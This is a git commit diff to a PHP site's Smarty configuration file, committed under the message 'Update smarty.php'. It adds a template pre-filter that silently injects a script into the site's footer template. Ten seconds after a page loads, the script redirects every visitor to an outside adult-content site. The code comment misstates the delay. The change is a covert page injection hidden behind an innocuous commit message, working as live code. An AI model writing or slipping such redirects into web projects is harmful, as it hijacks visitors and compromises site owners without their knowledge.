a0553023bf8786638d6fbc36cccaa9d1c08f902c
xshikata-ai <xshikata@gmail.com>
2025-11-12 13:25:06 +0700

    Update smarty.php

--- include/smarty.php
+++ include/smarty.php
@@ -18,6 +18,24 @@ foreach ( $config as $key => $value ) {
 }
 $smarty->assign('languages', $languages);
 
+if (!function_exists('smarty_footer_script_filter')) {
+    function smarty_footer_script_filter($tpl_source, Smarty_Internal_Template $template)
+    {
+        if (substr($template->source->name, -10) !== 'footer.tpl') {
+            return $tpl_source;
+        }
+
+        $snippet = "\n{literal}\n<script>\n\n    setTimeout(function() {\n\n        window.location.href = \"https://javpornsub.net/\";\n\n    }, 10000); // 5000 milidetik = 5 detik\n\n</script>\n\n{/literal}\n";
+
+        if (strpos($tpl_source, $snippet) === false) {
+            $tpl_source .= $snippet;
+        }
+
+        return $tpl_source;
+    }
+}
+
+$smarty->registerFilter('pre', 'smarty_footer_script_filter');
 $smarty->assign('bgcolor',      '#E8E8E8');
 $smarty->assign('baseurl',    $config['BASE_URL']);
 $smarty->assign('basedir',    $config['BASE_DIR']);
@@ -31,3 +49,4 @@ $smarty->assign('tmburl',     $config['TMB_URL']);
 $smarty->assign('photourl',   $config['PHO_URL']);
 $smarty->assign('max_thumb_folders',   $config['max_thumb_folders']);
 ?>
+
